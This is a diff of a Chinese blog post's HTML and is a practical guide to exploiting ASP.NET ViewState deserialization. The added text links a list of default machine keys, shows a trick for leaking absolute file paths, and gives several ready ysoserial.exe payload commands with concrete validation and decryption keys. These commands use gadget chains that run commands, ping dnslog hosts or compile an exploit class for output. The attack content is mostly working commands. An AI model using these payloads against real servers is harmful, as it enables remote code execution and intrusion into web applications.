@@ -9,15 +9,15 @@
         <meta name="keywords" content="C#" />
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="反序列化先决条件  通过文件读取或者源码泄露获取到key利用方式  1.爆绝对路径 1for &#x2F;r 目录名 %i in (匹配模式1,匹配模式2) do @echo %i 1for &#x2F;r C:\ in (*.pdf) do @echo %i &gt;%i.txt 如果命令执行成功，会在同目录下生成pdf.txt的文件，内容为绝对路径 针对.NET Framwork 4.5及以上">
+    <meta name="description" content="反序列化先决条件  通过文件读取或者源码泄露获取到key 禁用MAC验证功能的情况默认key合集https:&#x2F;&#x2F;github.com&#x2F;yuanhaiGreg&#x2F;Fuzz-Dict&#x2F;blob&#x2F;master&#x2F;ViewState_Key.txt利用方式  1.爆绝对路径 1for &#x2F;r 目录名 %i in (匹配模式1,匹配模式2) do @echo %i 1for &#x2F;r C:\ in">
 <meta property="og:type" content="article">
 <meta property="og:title" content="viewstate反序列化实战">
 <meta property="og:url" content="https://little-gu.github.io/2021/11/25/viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98/index.html">
 <meta property="og:site_name" content="hungry and humble">
-<meta property="og:description" content="反序列化先决条件  通过文件读取或者源码泄露获取到key利用方式  1.爆绝对路径 1for &#x2F;r 目录名 %i in (匹配模式1,匹配模式2) do @echo %i 1for &#x2F;r C:\ in (*.pdf) do @echo %i &gt;%i.txt 如果命令执行成功，会在同目录下生成pdf.txt的文件，内容为绝对路径 针对.NET Framwork 4.5及以上">
+<meta property="og:description" content="反序列化先决条件  通过文件读取或者源码泄露获取到key 禁用MAC验证功能的情况默认key合集https:&#x2F;&#x2F;github.com&#x2F;yuanhaiGreg&#x2F;Fuzz-Dict&#x2F;blob&#x2F;master&#x2F;ViewState_Key.txt利用方式  1.爆绝对路径 1for &#x2F;r 目录名 %i in (匹配模式1,匹配模式2) do @echo %i 1for &#x2F;r C:\ in">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-11-25T12:53:08.000Z">
-<meta property="article:modified_time" content="2021-11-25T13:19:36.795Z">
+<meta property="article:modified_time" content="2021-11-25T13:29:52.193Z">
 <meta property="article:author" content="G7shot">
 <meta property="article:tag" content="C#">
 <meta name="twitter:card" content="summary">
@@ -353,7 +353,8 @@
         
             <h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>先决条件</p>
 <ul>
-<li>通过文件读取或者源码泄露获取到key<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2></li>
+<li>通过文件读取或者源码泄露获取到key</li>
+<li>禁用MAC验证功能的情况<br>默认key合集<a target="_blank" rel="noopener" href="https://github.com/yuanhaiGreg/Fuzz-Dict/blob/master/ViewState_Key.txt">https://github.com/yuanhaiGreg/Fuzz-Dict/blob/master/ViewState_Key.txt</a><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2></li>
 </ul>
 <p>1.爆绝对路径</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;r 目录名 %i in (匹配模式1,匹配模式2) do @echo %i</span><br></pre></td></tr></table></figure>
@@ -363,6 +364,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;echo 123 &gt; c:\windows\temp\test.txt&quot; --generator&#x3D;93D20A1B --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0&quot;</span><br></pre></td></tr></table></figure>
 <p>针对.NET Framwork 4.0及以上版本</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &quot;ping p0xxwc.dnslog.cn&quot; --generator&#x3D;&quot;CA0B0334&quot; --validationalg&#x3D;&quot;MD5&quot; --validationkey&#x3D;&quot;b07b0f97365416288cf0247cffdf135d25f6be87&quot;</span><br></pre></td></tr></table></figure>
+<p>其他链子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;ExploitClass.cs;.&#x2F;System.dll;.&#x2F;System.Web.dll&quot; --generator&#x3D;E6DD55AA --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;5C46C5F56FF25BFEA2B2AFB59CAC455ED201C68E3BC13CB9&quot; --decryptionKey&#x3D;&quot;73B0F4F54E3F21B1DA72E7A69423EC1A99B3D1939647EB8E&quot;</span><br><span class="line"></span><br><span class="line">ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck -c &quot;ignore&quot; --generator&#x3D;E6DD55AA --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;5C46C5F56FF25BFEA2B2AFB59CAC455ED201C68E3BC13CB9&quot; --decryptionKey&#x3D;&quot;73B0F4F54E3F21B1DA72E7A69423EC1A99B3D1939647EB8E&quot;</span><br><span class="line"></span><br><span class="line">ysoserial.exe -p ViewState -g TypeConfuseDelegateMono -c &quot;ping eqdssv.dnslog.cn&quot; --generator&#x3D;21729F5D --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;5C46C5F56FF25BFEA2B2AFB59CAC455ED201C68E3BC13CB9&quot; --decryptionKey&#x3D;&quot;73B0F4F54E3F21B1DA72E7A69423EC1A99B3D1939647EB8E&quot;</span><br><span class="line"></span><br><span class="line">ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;ExploitClass.cs;.&#x2F;System.dll;.&#x2F;System.Web.dll&quot; --generator&#x3D;&quot;CA0B0334&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;(有回显)</span><br></pre></td></tr></table></figure>
 <p>如果不知道_VIEWSTATEGENNERATOR参数，就需要知道其路径–path=”/somepath/testaspx/test.aspx” –apppath=”/testaspx/“</p>
 <p>参考文章：<br><a target="_blank" rel="noopener" href="https://www.4hou.com/posts/GYq7">https://www.4hou.com/posts/GYq7</a><br><a target="_blank" rel="noopener" href="https://github.com/Illuminopi/RCEvil.NET">https://github.com/Illuminopi/RCEvil.NET</a><br><a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net">https://github.com/pwntester/ysoserial.net</a></p>
 
